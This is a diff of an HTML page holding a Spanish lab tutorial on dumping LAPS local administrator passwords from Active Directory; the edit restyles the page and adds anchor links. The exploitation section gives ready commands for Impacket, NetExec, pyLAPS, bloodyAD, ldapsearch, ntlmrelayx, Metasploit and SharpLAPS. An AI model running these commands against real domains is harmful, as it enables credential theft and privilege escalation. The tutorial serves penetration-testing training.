@@ -14,59 +14,109 @@
 
         body {
 
-            font-family: Arial, sans-serif;
+            font-family: 'Times New Roman', serif;
 
-            line-height: 1.6;
+            line-height: 1.7;
 
             margin: 0;
 
             padding: 20px;
 
-            background-color: #f4f4f4;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+
+            color: #e8e8e8;
 
         }
 
         .container {
 
-            max-width: 800px;
+            max-width: 900px;
 
             margin: auto;
 
-            background: white;
+            background: linear-gradient(145deg, #2d3748 0%, #1a202c 100%);
 
-            padding: 20px;
+            padding: 30px;
 
-            border-radius: 8px;
+            border-radius: 15px;
 
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+
+            border: 1px solid #4a5568;
 
         }
 
         h1, h2, h3 {
 
-            color: #333;
+            color: #f7fafc;
+
+            font-weight: 600;
+
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+
+        }
+
+        h1 {
+
+            font-size: 2.5em;
+
+            border-bottom: 3px solid #63b3ed;
+
+            padding-bottom: 15px;
+
+            margin-bottom: 30px;
+
+        }
+
+        h2 {
+
+            font-size: 1.8em;
+
+            border-left: 4px solid #63b3ed;
+
+            padding-left: 15px;
+
+            margin-top: 40px;
+
+            margin-bottom: 20px;
+
+        }
+
+        h3 {
+
+            font-size: 1.4em;
+
+            color: #b2f5ea;
 
         }
 
         pre {
 
-            background: #f8f8f8;
+            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
 
-            padding: 10px;
+            border: 1px solid #4a5568;
 
-            border-radius: 5px;
+            padding: 15px;
+
+            border-radius: 8px;
 
             overflow-x: auto;
+
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
 
         }
 
         code {
 
-            background: #f0f0f0;
+            background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
 
-            padding: 2px 4px;
+            border: 1px solid #4a5568;
 
-            border-radius: 3px;
+            padding: 3px 6px;
+
+            border-radius: 4px;
+
+            color: #63b3ed;
 
         }
 
@@ -76,7 +126,47 @@
 
             font-size: 0.9em;
 
-            color: #666;
+            color: #a0aec0;
+
+        }
+
+        a {
+
+            color: #63b3ed;
+
+            text-decoration: none;
+
+            transition: color 0.3s ease;
+
+        }
+
+        a:hover {
+
+            color: #90cdf4;
+
+            text-decoration: underline;
+
+        }
+
+        ul {
+
+            padding-left: 20px;
+
+        }
+
+        li {
+
+            margin-bottom: 8px;
+
+            line-height: 1.6;
+
+        }
+
+        footer {
+
+            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+
+            border: 1px solid #4a5568;
 
         }
 
@@ -90,158 +180,116 @@
 
         <h1>Volcado de Credenciales LAPS</h1>
 
-        
+        <h2 id="indice">Contenidos</h2>
 
-        <div class="page-number">1 | Página</div>
-
-        
-
-        <h2>Contenidos</h2>
-
-        <p>Introducción......3<br>
-
-        Introducción a LAPS......3<br>
-
-        Beneficios Clave de LAPS ......3<br>
-
-        Cómo LAPS Mejora la Seguridad ......4<br>
-
-        Implementación y Gestión de LAPS......4<br>
-
-        Funcionamiento de LAPS......4<br>
-
-        Tipos de LAPS......4<br>
-
-        Microsoft LAPS Legacy (MS LAPS)......4<br>
-
-        Nuevo Windows LAPS (Integrado en Windows 10/11 y Server 2019/2022)......4<br>
-
-        Pre-requisitos......4<br>
-
-        Configuración del Laboratorio......5<br>
-
-        Crear el Entorno AD:......5<br>
-
-        Controlador de Dominio:......5<br>
-
-        Crear una Unidad Organizativa......5<br>
-
-        Descargar e Instalar LAPS ......6<br>
-
-        Descargar LAPS ......7<br>
-
-        Instalar LAPS en el DC ......7<br>
-
-        Configurar Directiva de Grupo para LAPS......7<br>
-
-        Extender el Esquema de AD para LAPS......12<br>
-
-        Establecer Permisos de AD......12<br>
-
-        Desplegar LAPS en Máquinas Cliente......13<br>
-
-        Probar LAPS......14<br>
-
-        Comprender el Modelo de Seguridad de LAPS:......15<br>
-
-        Añadir un nuevo usuario de dominio a la Máquina Cliente con Permiso AllExtendedRights......15<br>
-
-        Explicación: Todos los Derechos Extendidos:......19<br>
-
-        Fase de Explotación ......20<br>
-
-        Bloodhound – Búsqueda de Permisos Débiles......20<br>
-
-        Explicación de BloodHound ......20<br>
-
-        Método de Explotación - Volcado de Credenciales (T1003)......22<br>
-
-        Impacket......22<br>
-
-        Herramienta NXC......23<br>
-
-        PyLaps ......23<br>
-
-        LAPSDumper......24<br>
-
-        BloodyAD......25<br>
-
-        Ldapsearch......25</p>
-
-
-        <div class="page-number">2 | Página</div>
-
-
-        <h2>Volcado de Credenciales LAPS</h2>
-
-        <p>Metasploit: ldap_query ...... 25<br>
-
-        Impacket-ntlmrelayx ...... 26<br>
-
-        ldap_shell ...... 28<br>
-
-        Explotación en Windows ...... 29<br>
-
-        PowerShell ...... 29<br>
-
-        NetTools ...... 29<br>
-
-        Sharplaps ...... 31<br>
-
-        Metasploit: enum_laps ...... 32<br>
-
-        Powerview ...... 32<br>
-
-        Explorador de Active Directory – Sysinternals ...... 33<br>
-
-        Conclusión ...... 34<br>
-
-        Mejores Prácticas para la Seguridad de LAPS: ...... 34<br>
-
-        Resumen de Puntos Clave ...... 35<br>
-
-        Notas ...... 35</p>
-
+        <ul>
+            <li><a href="#introduccion">Introducción</a></li>
+            <li><a href="#introduccion-laps">Introducción a LAPS</a></li>
+            <li><a href="#beneficios-laps">Beneficios Clave de LAPS</a></li>
+            <li><a href="#seguridad-laps">Cómo LAPS Mejora la Seguridad</a></li>
+            <li><a href="#implementacion-laps">Implementación y Gestión de LAPS</a></li>
+            <li><a href="#funcionamiento-laps">Funcionamiento de LAPS</a></li>
+            <li><a href="#tipos-laps">Tipos de LAPS</a>
+                <ul>
+                    <li><a href="#laps-legacy">Microsoft LAPS Legacy (MS LAPS)</a></li>
+                    <li><a href="#laps-windows">Nuevo Windows LAPS (Integrado en Windows 10/11 y Server 2019/2022)</a></li>
+                </ul>
+            </li>
+            <li><a href="#prerequisitos">Pre-requisitos</a></li>
+            <li><a href="#configuracion-laboratorio">Configuración del Laboratorio</a>
+                <ul>
+                    <li><a href="#controlador-dominio">Controlador de Dominio</a></li>
+                    <li><a href="#crear-ou">Crear una Unidad Organizativa</a></li>
+                    <li><a href="#descargar-laps">Descargar e Instalar LAPS</a></li>
+                    <li><a href="#descargar-laps-seccion">Descargar LAPS</a></li>
+                    <li><a href="#instalar-dc">Instalar LAPS en el DC</a></li>
+                    <li><a href="#configurar-gpo">Configurar Directiva de Grupo para LAPS</a></li>
+                    <li><a href="#extender-esquema">Extender el Esquema de AD para LAPS</a></li>
+                    <li><a href="#permisos-ad">Establecer Permisos de AD</a></li>
+                    <li><a href="#desplegar-clientes">Desplegar LAPS a Máquinas Cliente</a></li>
+                    <li><a href="#probar-laps">Probar LAPS</a></li>
+                </ul>
+            </li>
+            <li><a href="#modelo-seguridad">Comprender el Modelo de Seguridad de LAPS</a></li>
+            <li><a href="#permisos-usuario">Añadir un nuevo usuario de dominio a la Máquina Cliente con Permiso AllExtendedRights</a></li>
+            <li><a href="#explicacion-permisos">Explicación: Todos los Derechos Extendidos</a></li>
+            <li><a href="#fase-explotacion">Fase de Explotación</a>
+                <ul>
+                    <li><a href="#bloodhound">Bloodhound – Búsqueda de Permisos Débiles</a></li>
+                    <li><a href="#explicacion-bloodhound">Explicación de BloodHound</a></li>
+                    <li><a href="#metodo-explotacion">Método de Explotación - Volcado de Credenciales (T1003)</a></li>
+                    <li><a href="#impacket">Impacket</a></li>
+                    <li><a href="#nxc">Herramienta NXC</a></li>
+                    <li><a href="#pylaps">PyLaps</a></li>
+                    <li><a href="#lapsdumper">LAPSDumper</a></li>
+                    <li><a href="#bloodyad">BloodyAD</a></li>
+                    <li><a href="#ldapsearch">Ldapsearch</a></li>
+                    <li><a href="#metasploit-ldap">Metasploit: ldap_query</a></li>
+                    <li><a href="#ntlmrelayx">Impacket-ntlmrelayx</a></li>
+                    <li><a href="#ldap-shell">ldap_shell</a></li>
+                </ul>
+            </li>
+            <li><a href="#explotacion-windows">Explotación en Windows</a>
+                <ul>
+                    <li><a href="#powershell">PowerShell</a></li>
+                    <li><a href="#nettools">NetTools</a></li>
+                    <li><a href="#sharplaps">Sharplaps</a></li>
+                    <li><a href="#metasploit-enum">Metasploit: enum_laps</a></li>
+                    <li><a href="#powerview">Powerview</a></li>
+                    <li><a href="#ad-explorer">Explorador de Active Directory – Sysinternals</a></li>
+                </ul>
+            </li>
+            <li><a href="#conclusion">Conclusión</a>
+                <ul>
+                    <li><a href="#mejores-practicas">Mejores Prácticas para la Seguridad de LAPS</a></li>
+                    <li><a href="#resumen-puntos">Resumen de Puntos Clave</a></li>
+                    <li><a href="#notas">Notas</a></li>
+                </ul>
+            </li>
+            <li><a href="#programas-entrenamiento">ÚNETE A NUESTROS PROGRAMAS DE ENTRENAMIENTO</a>
+                <ul>
+                    <li><a href="#principiante">PRINCIPIANTE</a></li>
+                    <li><a href="#avanzado">AVANZADO</a></li>
+                    <li><a href="#experto">EXPERTO</a></li>
+                </ul>
+            </li>
+        </ul>
 
         <hr>
 
-
-        <h2>Introducción</h2>
+        <h2 id="introduccion">Introducción</h2>
 
         <p>En este artículo, discutiremos el concepto de Volcado de Credenciales y LAPS (Solución de Contraseñas de Administrador Local). Profundizaremos en el mundo de la gestión de contraseñas y exploraremos cómo LAPS puede ayudar a mitigar los riesgos asociados con el uso de cuentas y contraseñas locales compartidas en un dominio. Con la creciente amenaza de ciberataques, es esencial comprender la importancia de la gestión segura de contraseñas y cómo LAPS puede ayudar a agilizar este proceso.</p>
 
 
-        <h2>Introducción a LAPS</h2>
+        <h2 id="introduccion-laps">Introducción a LAPS</h2>
 
         <p>La Solución de Contraseñas de Administrador Local (LAPS) es una herramienta diseñada para gestionar las contraseñas de cuentas locales de computadoras unidas a un dominio. Almacena estas contraseñas de forma segura en <strong>Active Directory (AD)</strong> y las protege mediante <strong>Listas de Control de Acceso (ACLs)</strong>. En consecuencia, solo los usuarios autorizados pueden acceder o restablecerlas.</p>
 
 
-        <h3>Beneficios Clave de LAPS</h3>
+        <h3 id="beneficios-laps">Beneficios Clave de LAPS</h3>
 
         <p>En configuraciones donde los usuarios deben iniciar sesión en computadoras sin credenciales de dominio, la gestión de contraseñas puede volverse desafiante y aumentar el riesgo de ataques de Pass-the-Hash (PtH). Por lo tanto, <strong>LAPS</strong> aborda el problema de usar una <strong>cuenta local</strong> compartida con la misma contraseña en todas las <strong>computadoras de un dominio</strong>. Asigna una contraseña única y generada aleatoriamente a la <strong>cuenta de administrador local</strong> en cada máquina. Como resultado, los <strong>administradores de dominio</strong> pueden controlar qué usuarios, como el personal de soporte técnico, pueden ver estas contraseñas.</p>
 
 
-        <div class="page-number">3 | Página</div>
-
-
-        <h2>Cómo LAPS Mejora la Seguridad</h2>
+        <h2 id="seguridad-laps">Cómo LAPS Mejora la Seguridad</h2>
 
         <p><strong>LAPS</strong> agiliza la gestión de contraseñas mientras refuerza las defensas contra amenazas cibernéticas. Específicamente, reduce el riesgo de <strong>movimiento lateral</strong> dentro de una red, una vulnerabilidad que surge cuando se utilizan las mismas credenciales administrativas locales en múltiples computadoras. Almacena las contraseñas de la <strong>cuenta de administrador local</strong> de cada computadora en <strong>Active Directory</strong> dentro de un atributo confidencial vinculado al objeto de AD de la computadora. Además, las computadoras actualizan su información de contraseña en AD, y los <strong>administradores de dominio</strong> asignan permisos de lectura a usuarios o grupos específicos, como equipos de soporte técnico.</p>
 
 
-        <h2>Implementación y Gestión de LAPS</h2>
+        <h2 id="implementacion-laps">Implementación y Gestión de LAPS</h2>
 
         <p>Con LAPS, las contraseñas de administrador local en computadoras unidas a dominio se gestionan automáticamente, asegurando que sean únicas, creadas aleatoriamente y almacenadas de forma segura en Active Directory. Dado que está construido completamente en <strong>infraestructura de AD</strong>, <strong>LAPS</strong> no requiere tecnologías adicionales. Además, depende de una <strong>extensión del lado del cliente de Directiva de Grupo (CSE)</strong> instalada en las computadoras gestionadas para manejar todas las tareas, e incluye herramientas de gestión que simplifican la configuración y supervisión.</p>
 
 
-        <h2>Funcionamiento de LAPS</h2>
+        <h2 id="funcionamiento-laps">Funcionamiento de LAPS</h2>
 
         <p>En esencia, LAPS utiliza una extensión del lado del cliente de Directiva de Grupo (CSE) que realiza funciones clave durante una actualización de Directiva de Grupo. Primero, verifica si la <strong>contraseña de la cuenta de Administrador local</strong> ha expirado. Si ha expirado o necesita cambiar de forma preventiva, la CSE genera inmediatamente una nueva contraseña y asegura que cumpla con la <strong>política de contraseñas</strong>. Luego, la CSE actualiza <strong>Active Directory</strong> con la nueva contraseña, la almacena como un <strong>atributo confidencial</strong> vinculado a la cuenta de la computadora y registra la próxima fecha de expiración de la contraseña en un atributo separado. Adicionalmente, actualiza la <strong>contraseña de la cuenta de Administrador</strong> en la computadora. Finalmente, los usuarios autorizados pueden recuperar la contraseña de <strong>Active Directory</strong> o solicitar un restablecimiento de contraseña para una máquina específica según sea necesario.</p>
 
 
-        <h2>Tipos de LAPS</h2>
+        <h2 id="tipos-laps">Tipos de LAPS</h2>
 
-        <h3>Microsoft LAPS Legacy (MS LAPS)</h3>
+        <h3 id="laps-legacy">Microsoft LAPS Legacy (MS LAPS)</h3>
 
         <ul>
 
@@ -254,7 +302,7 @@
         </ul>
 
 
-        <h3>Nuevo Windows LAPS (Integrado en Windows 10/11 y Server 2019/2022)</h3>
+        <h3 id="laps-windows">Nuevo Windows LAPS (Integrado en Windows 10/11 y Server 2019/2022)</h3>
 
         <ul>
 
@@ -269,7 +317,7 @@
         </ul>
 
 
-        <h3>Pre-requisitos</h3>
+        <h3 id="prerequisitos">Pre-requisitos</h3>
 
         <ul>
 
@@ -284,17 +332,14 @@
         </ul>
 
 
-        <div class="page-number">4 | Página</div>
-
-
-        <h2>Configuración del Laboratorio</h2>
+        <h2 id="configuracion-laboratorio">Configuración del Laboratorio</h2>
 
         <p><strong>Crear el Entorno AD:</strong><br>
 
         Para simular un entorno de Active Directory, necesitará un Windows Server como Controlador de Dominio (DC) y una máquina cliente (Windows o Linux) donde pueda ejecutar herramientas de enumeración y explotación.</p>
 
 
-        <h3>Controlador de Dominio:</h3>
+        <h3 id="controlador-dominio">Controlador de Dominio:</h3>
 
         <ul>
 
@@ -307,7 +352,7 @@
         </ul>
 
 
-        <h3>Crear una Unidad Organizativa</h3>
+        <h3 id="crear-ou">Crear una Unidad Organizativa</h3>
 
         <p>Las unidades organizativas (OU) en un dominio gestionado por Servicios de Dominio de Active Directory (AD DS) permiten agrupar lógicamente objetos como cuentas de usuario, cuentas de servicio o cuentas de computadora. Luego puede asignar administradores a OU específicas y aplicar directivas de grupo para imponer configuraciones específicas.</p>
 
@@ -317,9 +362,6 @@
         <p>Haga clic derecho en <strong>Dominio (Ignite.local)</strong> y haga clic en <strong>Nuevo</strong>, y luego haga clic en <strong>Unidad Organizativa</strong>.</p>
 
         <p>Asigne el nombre de la OU como <strong>Tech</strong>.</p>
-
-
-        <div class="page-number">5 | Página</div>
 
 
         <h2>Volcado de Credenciales LAPS</h2>
@@ -342,20 +384,17 @@
         <p>En <strong>Usuarios y Equipos de Active Directory</strong>, bajo la OU Tech, debería ver su máquina cliente listada.</p>
 
 
-        <h3>Descargar e Instalar LAPS</h3>
+        <h3 id="descargar-laps">Descargar e Instalar LAPS</h3>
 
         <p>Antes de comenzar con la fase de volcado de credenciales, necesitamos configurar LAPS en nuestro Windows Server 2016 o máquina Windows 10. Necesitamos realizar 3 tareas específicas que incluyen la instalación del cliente completo de LAPS, la configuración del Módulo de PowerShell y la implementación de plantillas de Directiva de Grupo.</p>
 
 
-        <div class="page-number">6 | Página</div>
-
-
-        <h2>Descargar LAPS</h2>
+        <h2 id="descargar-laps-seccion">Descargar LAPS</h2>
 
         <p>Obtenga la última versión de LAPS desde el Centro de Descargas de Microsoft.</p>
 
 
-        <h2>Instalar LAPS en el DC</h2>
+        <h2 id="instalar-dc">Instalar LAPS en el DC</h2>
 
         <p>Ejecute el instalador .msi y seleccione:</p>
 
@@ -372,14 +411,11 @@
         <p>Complete la instalación.</p>
 
 
-        <h2>Configurar Directiva de Grupo para LAPS</h2>
+        <h2 id="configurar-gpo">Configurar Directiva de Grupo para LAPS</h2>
 
         <p>Abra la Consola de Gestión de Directivas de Grupo (GPMC).</p>
 
         <p>Cree un nuevo GPO o edite uno existente.</p>
-
-
-        <div class="page-number">7 | Página</div>
 
 
         <h2>Volcado de Credenciales LAPS</h2>
@@ -403,9 +439,6 @@
         <p>Habilite <strong>Gestión de contraseñas de administrador local</strong> → establecer en Habilitado.</p>
 
 
-        <div class="page-number">8 | Página</div>
-
-
         <h2>Volcado de Credenciales LAPS</h2>
 
         <p>Para que todos los cambios en la política estén activos, necesitamos realizar una actualización de Directiva de Grupo como se muestra en la imagen a continuación:</p>
@@ -423,7 +456,7 @@ Actualizando política...
 La actualización de la política de equipo se ha completado correctamente.</code></pre>
 
 
-        <h2>Extender el Esquema de AD para LAPS</h2>
+        <h2 id="extender-esquema">Extender el Esquema de AD para LAPS</h2>
 
         <p>Abra PowerShell como Administrador en el DC y ejecute el siguiente comando para actualizar el esquema:</p>
 
@@ -444,7 +477,7 @@ Update-AdmPwdADSchema</code></pre>
         </ul>
 
 
-        <h2>Establecer Permisos de AD</h2>
+        <h2 id="permisos-ad">Establecer Permisos de AD</h2>
 
         <p><strong>Permitir que las Computadoras Actualicen Sus Propias Contraseñas</strong></p>
 
@@ -453,9 +486,6 @@ Update-AdmPwdADSchema</code></pre>
         <p><strong>Conceder Acceso a los Administradores para Ver Contraseñas</strong></p>
 
         <pre><code>Set-AdmPwdReadPasswordPermission -OrgUnit Tech -AllowedPrincipals Administrators</code></pre>
-
-
-        <div class="page-number">9 | Página</div>
 
 
         <h2>Volcado de Credenciales LAPS</h2>
@@ -505,16 +535,13 @@ Nombre    DistinguishedName                Estado
 Tech      OU=Tech,DC=ignite,DC=local      Delegado</code></pre>
 
 
-        <h2>Desplegar LAPS a Máquinas Cliente</h2>
+        <h2 id="desplegar-clientes">Desplegar LAPS a Máquinas Cliente</h2>
 
         <p>Instale LAPS en todas las máquinas cliente mediante GPO, SCCM o instalación manual.</p>
 
         <p>Asegúrese de que el agente de LAPS esté ejecutándose ejecutando:</p>
 
         <pre><code>gpupdate /force</code></pre>
-
-
-        <div class="page-number">10 | Página</div>
 
 
         <h2>Volcado de Credenciales LAPS</h2>
@@ -539,7 +566,7 @@ La actualización de la política de usuario se ha completado correctamente.
 C:\Users\raj></code></pre>
 
 
-        <h2>Probar LAPS</h2>
+        <h2 id="probar-laps">Probar LAPS</h2>
 
         <p>Ahora, para asegurarse de que funciona correctamente, verifiquemos la contraseña asignada por LAPS a la Máquina Cliente (MSEDGEWIN10) en sus propiedades. Como puede observar en la imagen a continuación, LAPS ha asignado una contraseña aleatoria a la Máquina Cliente (MSEDGEWIN10).</p>
 
@@ -552,7 +579,7 @@ C:\Users\raj></code></pre>
         <p>Debería ver el atributo <strong>ms-Mcs-AdmPwd</strong> con una contraseña generada aleatoriamente.</p>
 
 
-        <h2>Comprender el Modelo de Seguridad de LAPS:</h2>
+        <h2 id="modelo-seguridad">Comprender el Modelo de Seguridad de LAPS:</h2>
 
         <p><strong>Intro:</strong> Configurar un usuario (raj) para recuperar contraseñas gestionadas por LAPS desde AD. Esto no es un ataque en sí mismo—es una acción administrativa legítima si la realiza un administrador autorizado. Sin embargo, si un atacante obtiene control de la cuenta raj o realiza estos pasos sin autorización, podría conducir a un <strong>ataque de escalada de privilegios</strong> o <strong>robo de credenciales</strong> de las siguientes maneras:</p>
 
@@ -569,7 +596,7 @@ C:\Users\raj></code></pre>
         <p>La cuenta win1 no tenía permiso para leer este atributo, por lo que está creando un nuevo usuario (raj) y otorgando los permisos mínimos necesarios para recuperar las contraseñas de LAPS.</p>
 
 
-        <h2>Añadir un nuevo usuario de dominio a la Máquina Cliente con Permiso AllExtendedRights.</h2>
+        <h2 id="permisos-usuario">Añadir un nuevo usuario de dominio a la Máquina Cliente con Permiso AllExtendedRights.</h2>
 
         <p>Abra ADUC. Navegue a <strong>OU Tech</strong> bajo el dominio. Debería ver la <strong>Máquina Cliente (MSEDGEWIN10)</strong> listada, haga clic derecho en ella y vaya a <strong>propiedades</strong>.</p>
 
@@ -584,12 +611,9 @@ C:\Users\raj></code></pre>
         <p>Aplique la configuración.</p>
 
 
-        <div class="page-number">11 | Página</div>
-
-
         <h2>Volcado de Credenciales LAPS</h2>
 
-        <h3>Explicación: Todos los Derechos Extendidos:</h3>
+        <h3 id="explicacion-permisos">Explicación: Todos los Derechos Extendidos:</h3>
 
         <ul>
 
@@ -604,11 +628,11 @@ C:\Users\raj></code></pre>
         <p>Ahora hemos terminado con la configuración del entorno de laboratorio para LAPS en Windows.</p>
 
 
-        <h2>Fase de Explotación</h2>
+        <h2 id="fase-explotacion">Fase de Explotación</h2>
 
-        <h3>Bloodhound – Búsqueda de Permisos Débiles</h3>
+        <h3 id="bloodhound">Bloodhound – Búsqueda de Permisos Débiles</h3>
 
-        <h4>Explicación de BloodHound</h4>
+        <h4 id="explicacion-bloodhound">Explicación de BloodHound</h4>
 
         <p><strong>Usar BloodHound para Confirmar Privilegios:</strong> Puede usar <strong>BloodHound</strong> para verificar que <strong>Raj</strong> tiene el permiso <strong>AllExtendedRights</strong> para la <strong>Máquina Cliente (MSEDGEWIN10)</strong>.</p>
 
@@ -625,26 +649,23 @@ C:\Users\raj></code></pre>
 
         <p>Usemos varias otras herramientas para realizar el ataque y recuperar la contraseña de administrador local, que es establecida por la herramienta LAPS.</p>
 
-        <h3>Impacket</h3>
+        <h3 id="impacket">Impacket</h3>
 
         <p>El conjunto de herramientas Impacket es una colección de bibliotecas y scripts de Python diseñados para trabajar con protocolos de red, particularmente aquellos utilizados en entornos Windows, como SMB, Kerberos, LDAP y NTLM.</p>
 
         <pre><code>impacket-GetLAPSPassword ignite.local/raj:Password@1 -dc-ip 192.168.1.48</code></pre>
 
 
-        <div class="page-number">12 | Página</div>
-
-
         <h2>Volcado de Credenciales LAPS</h2>
 
-        <h3>Herramienta NXC</h3>
+        <h3 id="nxc">Herramienta NXC</h3>
 
         <p>NXC, abreviatura de NetExec, es una herramienta basada en Python que automatiza la explotación de servicios de red como SMB, LDAP, WinRM, RDP, WMI, MSSQL y más. Está diseñada para agilizar las pruebas de penetración internas al proporcionar una interfaz unificada para interactuar con protocolos Windows, muy similar a Impacket, pero con un enfoque en soporte multiprotocolo y extensiones modulares.</p>
 
         <pre><code>nxc ldap "192.168.1.48" -d "ignite.local" -u "raj" -p "Password@1" --module laps</code></pre>
 
 
-        <h3>PyLaps</h3>
+        <h3 id="pylaps">PyLaps</h3>
 
         <p>GitHub - p0dalirius/pyLAPS: Setter/Getter de Python para la propiedad ms-Mcs-AdmPwd utilizada por LAPS.</p>
 
@@ -663,7 +684,7 @@ chmod 777 pyLAPS.py</code></pre>
         <pre><code>./pyLAPS.py --action get -d "192.168.1.48" -u "raj" -p "Password@1"</code></pre>
 
 
-        <h3>LAPSDumper</h3>
+        <h3 id="lapsdumper">LAPSDumper</h3>
 
         <p>GitHub - n00py/LAPSDumper: Volcado de LAPS desde Python</p>
 
@@ -680,26 +701,23 @@ chmod 777 laps.py</code></pre>
         <pre><code>python laps.py -u 'raj' -p 'Password@1' -d 'ignite.local'</code></pre>
 
 
-        <div class="page-number">13 | Página</div>
-
-
         <h2>Volcado de Credenciales LAPS</h2>
 
-        <h3>BloodyAD</h3>
+        <h3 id="bloodyad">BloodyAD</h3>
 
         <p>BloodyAD es un framework de escalada de privilegios de Active Directory (AD) de código abierto diseñado para ayudar a profesionales de seguridad, probadores de penetración y equipos rojos a identificar y explotar rutas de escalada de privilegios dentro de entornos AD.</p>
 
         <pre><code>bloodyAD --host "192.168.1.48" -d "ignite.local" -u "raj" -p "Password@1" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</code></pre>
 
 
-        <h3>Ldapsearch</h3>
+        <h3 id="ldapsearch">Ldapsearch</h3>
 
         <p>ldapsearch es una herramienta de línea de comandos utilizada para consultar y recuperar información de un servicio de directorio LDAP (Lightweight Directory Access Protocol), como Active Directory (AD) o un servidor OpenLDAP. Es parte de la suite de software OpenLDAP y es ampliamente utilizada por administradores de sistemas, profesionales de seguridad y probadores de penetración para interactuar con directorios LDAP, extraer datos (por ejemplo, cuentas de usuario, membresías de grupo o atributos como contraseñas LAPS) y solucionar problemas relacionados con el directorio. ldapsearch le permite realizar búsquedas basadas en filtros, recuperar atributos específicos y autenticarse en el directorio utilizando varios métodos.</p>
 
         <pre><code>ldapsearch -x -H ldap://192.168.1.48 -D "raj@ignite.local" -w "Password@1" -b "dc=ignite,dc=local" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd</code></pre>
 
 
-        <h3>Metasploit: ldap_query</h3>
+        <h3 id="metasploit-ldap">Metasploit: ldap_query</h3>
 
         <p>Este módulo (auxiliary/gather/ldap_query) permite a los usuarios consultar un servidor LDAP usando una consulta LDAP personalizada o un conjunto de consultas LDAP bajo una categoría específica.</p>
 
@@ -718,7 +736,7 @@ set action ENUM_LAPS_PASSWORDS
 run</code></pre>
 
 
-        <h3>Impacket-ntlmrelayx</h3>
+        <h3 id="impacket">Impacket-ntlmrelayx</h3>
 
         <p>Este módulo realiza los ataques de Relay SMB descubiertos originalmente por cDc, extendidos a muchos protocolos objetivo (SMB, MSSQL, LDAP, etc.)</p>
 
@@ -727,15 +745,12 @@ run</code></pre>
         <pre><code>impacket-ntlmrelayx -t ldaps://192.168.1.48 -debug --dump-laps --no-dump --no-da --no-acl --no-validate-privs</code></pre>
 
 
-        <div class="page-number">14 | Página</div>
-
-
         <h2>Volcado de Credenciales LAPS</h2>
 
         <p>Después de una breve espera, recibimos una conexión HTTP desde la cuenta del usuario Raj junto con la contraseña de LAPS.</p>
 
 
-        <h3>ldap_shell</h3>
+        <h3 id="ldap-shell">ldap_shell</h3>
 
         <p>Este proyecto es un fork de ldap_shell de Impacket. Proporciona una shell interactiva para la enumeración y manipulación de Active Directory a través de protocolos LDAP/LDAPS, haciéndolo útil tanto para administradores de sistemas como para profesionales de seguridad.</p>
 
@@ -754,9 +769,9 @@ python3 -m pipx install .</code></pre>
         <pre><code>ldap_shell ignite.local/raj:Password@1 -dc-ip 192.168.1.48</code></pre>
 
 
-        <h2>Explotación en Windows</h2>
+        <h2 id="explotacion-windows">Explotación en Windows</h2>
 
-        <h3>PowerShell</h3>
+        <h3 id="powershell">PowerShell</h3>
 
         <p>Descargar Get-LAPSPasswords</p>
 
@@ -767,14 +782,11 @@ Import-Module .\Get-LAPSPasswords.ps1
 Get-LAPSPasswords -DomainController 192.168.1.48 -Credential IGNITE\raj | Format-Table -Autosize</code></pre>
 
 
-        <h3>NetTools</h3>
+        <h3 id="nettools">NetTools</h3>
 
         <p>Descargar | NetTools</p>
 
         <p>NetTools es una herramienta gratuita de solución de problemas de Active Directory, que proporciona la capacidad de solucionar problemas, consultar, informar y actualizar Active Directory y otros directorios basados en LDAP.</p>
-
-
-        <div class="page-number">15 | Página</div>
 
 
         <h2>Volcado de Credenciales LAPS</h2>
@@ -782,7 +794,7 @@ Get-LAPSPasswords -DomainController 192.168.1.48 -Credential IGNITE\raj | Format
         <p>Dentro de NetTools, puede navegar para ver los atributos de la computadora, incluida la contraseña de LAPS.</p>
 
 
-        <h3>Sharplaps</h3>
+        <h3 id="sharplaps">Sharplaps</h3>
 
         <p>Descargar Sharplaps</p>
 
@@ -791,7 +803,7 @@ Get-LAPSPasswords -DomainController 192.168.1.48 -Credential IGNITE\raj | Format
         <pre><code>C:\Users\raj\Downloads>SharpLAPS.exe /user:IGNITE\raj /pass:Password@1 /host:192.168.1.48</code></pre>
 
 
-        <h3>Metasploit: enum_laps</h3>
+        <h3 id="metasploit-enum">Metasploit: enum_laps</h3>
 
         <p>Este módulo (post/windows/gather/credentials/enum_laps) recuperará las contraseñas de LAPS (Solución de Contraseñas de Administrador Local), configuradas en Active Directory, a las que generalmente solo pueden acceder usuarios privilegiados. Tenga en cuenta que el nombre de la cuenta de administrador local no se almacena en Active Directory, por lo que se supone que es 'Administrador' por defecto.</p>
 
@@ -802,7 +814,7 @@ set session 1
 run</code></pre>
 
 
-        <h3>Powerview</h3>
+        <h3 id="powerview">Powerview</h3>
 
         <p>PowerView es una herramienta de PowerShell para obtener conciencia situacional de la red en dominios Windows.</p>
 
@@ -813,19 +825,16 @@ run</code></pre>
 Get-DomainComputer MSEDGEWIN10 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime</code></pre>
 
 
-        <h3>Explorador de Active Directory – Sysinternals</h3>
+        <h3 id="ad-explorer">Explorador de Active Directory – Sysinternals</h3>
 
         <p>Explorador de Active Directory (AD Explorer) es un visor y editor avanzado de Active Directory (AD). Puede usar AD Explorer para navegar fácilmente por una base de datos de AD, definir ubicaciones favoritas, ver propiedades y atributos de objetos sin tener que abrir cuadros de diálogo, editar permisos, ver el esquema de un objeto y ejecutar búsquedas sofisticadas que puede guardar y volver a ejecutar.</p>
 
         <p>AD Explorer - Sysinternals | Microsoft Learn</p>
 
 
-        <div class="page-number">16 | Página</div>
+        <h2 id="conclusion">Conclusión</h2>
 
-
-        <h2>Conclusión</h2>
-
-        <h3>Mejores Prácticas para la Seguridad de LAPS:</h3>
+        <h3 id="mejores-practicas">Mejores Prácticas para la Seguridad de LAPS:</h3>
 
         <ul>
 
@@ -846,7 +855,7 @@ Get-DomainComputer MSEDGEWIN10 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-Adm
